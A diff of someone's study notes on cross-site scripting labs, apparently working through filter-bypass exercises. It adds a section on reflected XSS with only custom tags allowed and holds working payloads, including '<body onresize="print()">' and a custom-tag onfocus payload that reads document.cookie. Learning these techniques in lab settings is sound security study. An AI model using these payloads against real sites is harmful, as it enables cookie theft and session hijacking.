@@ -58,13 +58,13 @@ Copy tags to clipboard
 
 ![[Pasted image 20240806115813.png]]
 
-Status 200 --> <body>
+Status 200 --> body
 
 "Attribute is not allowed"
 
 Copy events to clipboard
 
-![[Pasted image 20240806120258.png]]
+![[Pasted image 20240806120249.png]]
 
 ```js
 <body onresize="print()">
@@ -75,6 +75,11 @@ Copy events to clipboard
 ```
 
 
+# Reflected XSS into HTML context with all tags blocked except custom ones
+
+```html
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+```
 
 
 
